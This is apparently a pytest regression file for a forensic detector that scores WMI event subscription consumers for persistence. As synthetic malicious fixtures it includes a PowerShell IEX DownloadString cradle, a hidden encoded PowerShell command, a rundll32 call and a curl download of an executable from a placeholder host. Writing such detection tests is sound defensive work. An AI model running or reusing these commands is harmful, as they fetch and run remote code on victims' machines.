"""slot31AV regression: WMI subscription scorer is payload-gated and
runs on per-instance identity, not type-bucket collapse.

The compiler (_c_wmi_subscription) must:
  * Build entity_id from extracted_name + type + extracted_consumer_ref
    + a short hash of (extracted_script_text | extracted_script_filename
    | extracted_command_template) so distinct subscriptions do not
    collapse into a single fact per type.
  * Preserve the verbatim parser record as JSON in raw_excerpt so the
    scorer can read typed extractor fields that the storage layer
    strips from typed_facts.

The scorer (_score_fact, wmi_subscription_fact branch) must:
  * Suppress consumer rows with NO payload (default class definitions
    / SCM Event Log Consumer bindings shipped with Windows) ->
    "wmi_default_consumer_no_payload" suppression, no signal.
  * Fire wmi_event_subscription_persistence on consumer rows whose
    payload (script_text / script_filename / command_template /
    executable_path) matches ENCODED_OR_DOWNLOAD, SUSPICIOUS_STAGING
    + EXEC_EXT, LOLBIN, or non-allowlisted URL regexes.
  * Map the signal to candidate_type "wmi_event_subscription_persistence"
    and treat it as strong-ready.

Dataset-agnostic: uses fabricated names and synthetic payload patterns;
no rd-01 literals.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from sift_sentinel.analysis.candidate_observations import (  # noqa: E402
    _candidate_type,
    _claim_templates,
    _is_strong_ready,
    _score_fact,
)
from sift_sentinel.analysis.evidence_db import _c_wmi_subscription  # noqa: E402


SIGNAL = "wmi_event_subscription_persistence"
SUPPRESSION = "wmi_default_consumer_no_payload"


def _rand_name() -> str:
    return "syn_" + secrets.token_hex(4)


def _wmi_fact(rec: dict) -> dict:
    """Wrap a parser record into the runtime-storage shape (raw_excerpt JSON)."""
    return {
        "fact_id": f"wmi-{secrets.token_hex(4)}",
        "fact_type": "wmi_subscription_fact",
        "entity_id": "wmi:" + secrets.token_hex(8),
        "source_tool": "parse_wmi_subscription",
        "record_ref": "parse_wmi_subscription#" + secrets.token_hex(4),
        "raw_excerpt": json.dumps(rec),
        "artifact": [rec.get("type"), rec.get("extracted_name") or ""],
    }


# ── COMPILER: per-instance identity (no over-merge) ─────────────────


def test_compiler_emits_per_instance_facts_not_type_buckets():
    """22 distinct active-script consumers with different script bodies
    must produce 22 facts, not 1 type-bucket. Replicates the rd-01 bug
    where _c_wmi_subscription keyed on (type, name, target) and
    collapsed everything.
    """
    records = []
    for i in range(22):
        records.append({
            "type": "wmi_active_script_consumer",
            "extracted_name": f"{_rand_name()}_{i}",
            "extracted_script_engine": "JScript",
            "extracted_script_text": f"// synthetic body {i} {secrets.token_hex(6)}",
        })
    facts = [f for _, f, err in _c_wmi_subscription(records) if f is not None and err is None]
    assert len(facts) == 22, f"expected 22 per-instance facts, got {len(facts)}"
    # Per-instance entity_ids must be unique.
    assert len({f["entity_id"] for f in facts}) == 22


def test_compiler_distinguishes_two_consumers_with_same_name_but_different_payload():
    """Even when name + type collide, distinct payload bodies must
    produce distinct entity_ids (payload hash discriminator).
    """
    shared = "Shared" + secrets.token_hex(2)
    records = [
        {"type": "wmi_active_script_consumer", "extracted_name": shared,
         "extracted_script_text": "payload-A " + secrets.token_hex(8)},
        {"type": "wmi_active_script_consumer", "extracted_name": shared,
         "extracted_script_text": "payload-B " + secrets.token_hex(8)},
    ]
    facts = [f for _, f, _ in _c_wmi_subscription(records) if f]
    assert len(facts) == 2
    assert facts[0]["entity_id"] != facts[1]["entity_id"]


def test_compiler_preserves_raw_excerpt_as_json_with_typed_fields():
    """raw_excerpt must be the verbatim parser record so the scorer's
    _parse_raw_excerpt can read extracted_* fields. The storage layer
    strips typed fields; raw_excerpt is the structural source-of-truth.
    """
    rec = {
        "type": "wmi_command_line_consumer",
        "extracted_name": _rand_name(),
        "extracted_command_template": "cmd.exe /c whoami",
    }
    facts = [f for _, f, _ in _c_wmi_subscription([rec]) if f]
    assert len(facts) == 1
    parsed = json.loads(facts[0]["raw_excerpt"])
    assert parsed.get("extracted_command_template") == "cmd.exe /c whoami"
    assert parsed.get("type") == "wmi_command_line_consumer"


# ── SCORER: payload-gated ───────────────────────────────────────────


def test_benign_default_consumer_no_payload_does_not_fire():
    """ActiveScript consumer with empty script body - the rd-01 shape
    of every Windows-shipped default consumer. Must suppress, not fire.
    """
    fact = _wmi_fact({
        "type": "wmi_active_script_consumer",
        "extracted_name": "ActiveScriptEventConsumer",
        "extracted_script_text": "",
    })
    _, signals, suppressions = _score_fact(fact)
    assert SIGNAL not in signals, signals
    assert SUPPRESSION in suppressions, suppressions


def test_benign_nt_eventlog_consumer_no_payload_does_not_fire():
    """NTEventLog / SMTP / LogFile / VolumeChange consumers carry no
    payload field - all default class definitions shipped with Windows
    must be excluded by the payload gate.
    """
    for wtype in (
        "wmi_nt_event_log_consumer",
        "wmi_smtp_consumer",
        "wmi_log_file_consumer",
    ):
        fact = _wmi_fact({"type": wtype, "extracted_name": _rand_name()})
        _, signals, suppressions = _score_fact(fact)
        assert SIGNAL not in signals, (wtype, signals)
        assert SUPPRESSION in suppressions, (wtype, suppressions)


def test_malicious_active_script_consumer_iex_downloadstring_fires():
    """ActiveScript body with classic PowerShell download cradle -
    must fire wmi_event_subscription_persistence and be strong-ready.
    """
    fact = _wmi_fact({
        "type": "wmi_active_script_consumer",
        "extracted_name": _rand_name(),
        "extracted_script_engine": "JScript",
        "extracted_script_text":
            "IEX(New-Object Net.WebClient).DownloadString("
            "'http://" + secrets.token_hex(4) + ".tld/a')",
    })
    score, signals, _ = _score_fact(fact)
    assert SIGNAL in signals, signals
    assert score >= 80, score
    assert _is_strong_ready(set(signals))
    assert _candidate_type(set(signals)) == "wmi_event_subscription_persistence"
    claims = _claim_templates(set(signals))
    assert any("wmi_event_subscription_persistence" in c for c in claims), claims


def test_malicious_command_line_consumer_encoded_powershell_fires():
    """CommandLine consumer with -enc base64 PowerShell payload -
    typical lateral-execution persistence pattern. Must fire.
    """
    fact = _wmi_fact({
        "type": "wmi_command_line_consumer",
        "extracted_name": _rand_name(),
        "extracted_command_template":
            "powershell -nop -w hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    })
    score, signals, _ = _score_fact(fact)
    assert SIGNAL in signals, signals
    assert score >= 80, score
    assert _is_strong_ready(set(signals))


def test_malicious_consumer_lolbin_alone_fires():
    """Bare LOLBIN reference in a consumer payload still fires."""
    fact = _wmi_fact({
        "type": "wmi_command_line_consumer",
        "extracted_name": _rand_name(),
        "extracted_command_template": "rundll32.exe shell32.dll,#61",
    })
    _, signals, _ = _score_fact(fact)
    assert SIGNAL in signals
    assert _is_strong_ready(set(signals))


def test_malicious_consumer_non_vendor_url_fires():
    """URL in payload that is NOT in the vendor/update allowlist must fire."""
    fact = _wmi_fact({
        "type": "wmi_command_line_consumer",
        "extracted_name": _rand_name(),
        "extracted_command_template":
            "cmd /c curl http://" + secrets.token_hex(4) + ".example/x -o c:\\a.exe",
    })
    _, signals, _ = _score_fact(fact)
    assert SIGNAL in signals


def test_consumer_with_payload_but_no_suspicious_marker_does_not_fire():
    """Consumer carrying a payload that is benign (no LOLBIN, no
    encoding, no staging path, no non-vendor URL) must NOT be
    strong-ready - weak/context only.
    """
    # No LOLBIN, no encoding/download keywords, no staging-path + EXEC_EXT
    # combo, no URL. notepad/wordpad/etc. are NOT in _LOLBIN_RE.
    fact = _wmi_fact({
        "type": "wmi_command_line_consumer",
        "extracted_name": _rand_name(),
        "extracted_command_template": "notepad.exe readme",
    })
    _, signals, _ = _score_fact(fact)
    assert SIGNAL not in signals, signals
    assert not _is_strong_ready(set(signals))


def test_filter_and_binding_records_do_not_fire():
    """EventFilter and FilterToConsumerBinding rows are not consumers -
    the payload gate ("consumer" in wtype) excludes them by design.
    """
    for wtype in ("wmi_event_filter", "wmi_filter_to_consumer_binding"):
        fact = _wmi_fact({"type": wtype, "extracted_name": _rand_name()})
        _, signals, _ = _score_fact(fact)
        assert SIGNAL not in signals
